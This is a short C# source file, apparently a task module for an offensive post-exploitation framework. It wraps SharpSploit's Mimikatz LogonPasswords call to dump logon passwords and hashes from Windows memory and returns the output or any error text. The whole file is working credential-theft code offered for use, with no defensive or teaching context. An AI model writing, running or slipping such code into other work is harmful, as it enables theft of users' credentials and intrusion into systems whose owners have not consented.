using System;
using SharpSploit.Credentials;

namespace ExecSploit
{
    public static class LogonPasswords
    {
        public static string Execute()
        {
            try
            {
                return SharpSploit.Credentials.Mimikatz.LogonPasswords();
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
}